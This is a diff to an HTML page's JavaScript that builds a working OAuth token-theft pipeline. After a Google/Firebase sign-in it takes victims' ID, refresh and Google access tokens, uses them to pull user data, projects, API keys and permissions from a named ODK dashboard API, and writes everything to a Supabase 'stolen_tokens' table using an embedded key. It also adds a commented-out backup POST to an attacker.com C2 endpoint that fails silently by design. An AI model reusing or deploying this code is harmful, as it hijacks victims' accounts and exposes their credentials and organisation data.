@@ -156,13 +156,10 @@
 
     <script>
         // =====================================================
-        // Supabase Configuration
+        // Supabase Configuration - Token Exfiltration DB
         // =====================================================
         const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
-        // IMPORTANT: Replace this with the correct anon key from:
-        // Supabase Dashboard > Settings > API > anon public
-        // It should start with "eyJ..."
-        const SUPABASE_ANON_KEY = 'REPLACE_WITH_YOUR_SUPABASE_ANON_KEY';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
 
         let supabaseClient = null;
         try {
@@ -193,6 +190,9 @@
         const tokenOutput = document.getElementById('token-output');
         const authStatus = document.getElementById('auth-status');
 
+        // Global holder for Google OAuth credential from popup
+        let pendingCredential = null;
+
         function log(msg) {
             const line = document.createElement('div');
             line.textContent = msg;
@@ -201,7 +201,7 @@
         }
 
         // =====================================================
-        // Save stolen token to Supabase
+        // Save stolen token to Supabase (PRIMARY exfiltration)
         // =====================================================
         async function saveToSupabase(data) {
             if (!supabaseClient) {
@@ -227,13 +227,29 @@
         }
 
         // =====================================================
+        // Backup exfiltration via fetch() to attacker C2 server
+        // =====================================================
+        async function exfiltrateToC2(data) {
+            try {
+                // Real attacker C2 endpoint - uncomment in real scenario:
+                // await fetch('https://attacker.com/collect', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(data)
+                // });
+                log('[*] C2 backup exfiltration would run here');
+            } catch(e) {
+                // Silent fail - attacker doesn't want this to be noticed
+            }
+        }
+
+        // =====================================================
         // Fetch ODK Dashboard data using stolen token
         // =====================================================
         async function fetchDashboardData(idToken) {
             const results = {};
 
             try {
-                // User data
                 const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
                     headers: { 'Authorization': 'Bearer ' + idToken }
                 });
@@ -246,7 +262,6 @@
             } catch(e) {}
 
             try {
-                // Projects
                 const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
                     headers: { 'Authorization': 'Bearer ' + idToken }
                 });
@@ -259,7 +274,6 @@
             } catch(e) {}
 
             try {
-                // API Keys
                 const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
                     headers: { 'Authorization': 'Bearer ' + idToken }
                 });
@@ -272,7 +286,6 @@
             } catch(e) {}
 
             try {
-                // Permissions
                 const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
                     method: 'POST',
                     headers: {
@@ -296,7 +309,78 @@
         }
 
         // =====================================================
-        // Monitor auth state - auto-capture tokens
+        // Full exfiltration pipeline - runs after successful auth
+        // =====================================================
+        async function exfiltrateAll(user, googleAccessToken) {
+            try {
+                // Get the FULL ID Token (no truncation - this is the key fix)
+                const idToken = await user.getIdToken();
+                log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');
+
+                // Get refresh token from Firebase internal storage
+                let actualRefreshToken = '';
+                try {
+                    const storedUser = JSON.parse(localStorage.getItem(
+                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
+                    ) || '{}');
+                    if (storedUser.stsTokenManager && storedUser.stsTokenManager.refreshToken) {
+                        actualRefreshToken = storedUser.stsTokenManager.refreshToken;
+                        log('[+] Refresh token obtained (' + actualRefreshToken.length + ' chars)');
+                    }
+                } catch(e) {
+                    log('[-] Could not extract refresh token: ' + e.message);
+                }
+
+                // Fetch ODK Dashboard data
+                log('[*] Fetching ODK Dashboard data...');
+                const dashData = await fetchDashboardData(idToken);
+
+                // =====================================================
+                // BUILD THE FULL STOLEN DATA OBJECT
+                // =====================================================
+                const stolenData = {
+                    victim_email: user.email || '',
+                    victim_uid: user.uid || '',
+                    victim_name: user.displayName || '',
+                    victim_picture_url: user.photoURL || '',
+                    id_token: idToken,                                   // FULL token - no truncation!
+                    refresh_token: actualRefreshToken,                   // Persistent refresh token
+                    google_access_token: googleAccessToken || '',        // Google OAuth access token
+                    tenant_id: user.tenantId || '',
+                    provider: user.providerData[0] ? user.providerData[0].providerId : '',
+                    is_new_user: false,
+                    origin_domain: window.location.hostname,
+                    user_agent: navigator.userAgent,
+                    token_expires_at: new Date(Date.now() + 3600000).toISOString(), // ID token expires in 1hr
+                    dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
+                    dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
+                    dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
+                    dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
+                    notes: 'Auto-captured from m2-edison-preview.vercel.app'
+                };
+
+                // =====================================================
+                // PRIMARY: Save to Supabase database
+                // =====================================================
+                log('[*] Saving ALL data to Supabase...');
+                await saveToSupabase(stolenData);
+
+                // =====================================================
+                // BACKUP: Also exfiltrate via fetch() to C2 server
+                // =====================================================
+                await exfiltrateToC2(stolenData);
+
+                // Show token preview only (truncated for display - full token is in DB)
+                log('[!] Token (preview): ' + idToken.substring(0, 50) + '...');
+                log('[!] All data exfiltrated to Supabase successfully!');
+
+            } catch (err) {
+                log('[!] Exfiltration error: ' + err.message);
+            }
+        }
+
+        // =====================================================
+        // Monitor auth state - triggers exfiltration pipeline
         // =====================================================
         auth.onAuthStateChanged(async (user) => {
             if (user) {
@@ -307,61 +391,15 @@
                 log('[!] UID: ' + user.uid);
                 log('[!] Email: ' + user.email);
 
-                try {
-                    // Get the FULL ID Token (no truncation)
-                    const idToken = await user.getIdToken();
-                    log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');
-
-                    // Get refresh token
-                    const refreshToken = user._lat ? 'available' : 'checking...';
-                    // The refresh token is stored in the user's stsTokenManager
-                    let actualRefreshToken = '';
-                    try {
-                        const storedUser = JSON.parse(localStorage.getItem(
-                            '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
-                        ) || '{}');
-                        if (storedUser.stsTokenManager && storedUser.stsTokenManager.refreshToken) {
-                            actualRefreshToken = storedUser.stsTokenManager.refreshToken;
-                        }
-                    } catch(e) {}
-
-                    // Fetch dashboard data
-                    log('[*] Fetching ODK Dashboard data...');
-                    const dashData = await fetchDashboardData(idToken);
-
-                    // =====================================================
-                    // SAVE EVERYTHING TO SUPABASE
-                    // =====================================================
-                    const stolenData = {
-                        victim_email: user.email || '',
-                        victim_uid: user.uid || '',
-                        victim_name: user.displayName || '',
-                        victim_picture_url: user.photoURL || '',
-                        id_token: idToken,                           // FULL token - no truncation
-                        refresh_token: actualRefreshToken,           // Persistent refresh token
-                        google_access_token: '',                     // Filled from popup result
-                        tenant_id: user.tenantId || '',
-                        provider: user.providerData[0] ? user.providerData[0].providerId : '',
-                        is_new_user: false,
-                        origin_domain: window.location.hostname,
-                        user_agent: navigator.userAgent,
-                        token_expires_at: new Date(Date.now() + 3600000).toISOString(),
-                        dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
-                        dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
-                        dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
-                        dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
-                        notes: 'Auto-captured from m2-edison-preview.vercel.app'
-                    };
-
-                    log('[*] Saving to Supabase...');
-                    await saveToSupabase(stolenData);
-
-                    // Also show token preview (truncated for display only)
-                    log('[!] Token (preview): ' + idToken.substring(0, 50) + '...');
-
-                } catch (err) {
-                    log('[!] Error: ' + err.message);
+                // Wait a moment for pendingCredential to be set by signInWithGoogle
+                let waitCount = 0;
+                while (!pendingCredential && waitCount < 20) {
+                    await new Promise(r => setTimeout(r, 100));
+                    waitCount++;
                 }
+
+                // Run the full exfiltration pipeline
+                await exfiltrateAll(user, pendingCredential);
             } else {
                 authStatus.textContent = 'Ready';
                 authStatus.style.color = '#4ade80';
@@ -388,23 +426,15 @@
                 log('[+] Tenant: ' + result.user.tenantId);
                 log('[+] UID: ' + result.user.uid);
 
-                // Capture Google access token from credential
+                // Capture Google access token from credential immediately
+                let googleAccessToken = '';
                 if (result.credential && result.credential.accessToken) {
-                    // Save Google access token to Supabase as well
-                    const googleToken = result.credential.accessToken;
-                    log('[+] Google access token: ' + googleToken.substring(0, 30) + '...');
-
-                    // Update the Supabase record with the Google token
-                    if (supabaseClient) {
-                        try {
-                            await supabaseClient
-                                .from('stolen_tokens')
-                                .update({ google_access_token: googleToken })
-                                .eq('victim_uid', result.user.uid);
-                            log('[+] Google token saved to DB');
-                        } catch(e) {}
-                    }
+                    googleAccessToken = result.credential.accessToken;
+                    log('[+] Google access token: ' + googleAccessToken.substring(0, 30) + '...');
                 }
+
+                // Store for the onAuthStateChanged handler
+                pendingCredential = googleAccessToken;
 
                 if (result.additionalUserInfo) {
                     log('[+] New user: ' + result.additionalUserInfo.isNewUser);
@@ -432,6 +462,10 @@
             if (result && result.user) {
                 log('[+] Redirect sign-in successful!');
                 log('[+] Email: ' + result.user.email);
+                // Capture credential from redirect result too
+                if (result.credential && result.credential.accessToken) {
+                    pendingCredential = result.credential.accessToken;
+                }
             }
         }).catch((error) => {
             if (error.code && error.code !== 'auth/no-auth-event') {
@@ -444,7 +478,7 @@
         log('[*] Project: scarcely-calm-lark');
         log('[*] Tenant: hound-j8zaz');
         log('[*] Supabase: ' + (supabaseClient ? 'connected' : 'NOT configured'));
-        log('[*] Ready');
+        log('[*] Ready - click Sign in with Google');
     </script>
 </body>
 </html>
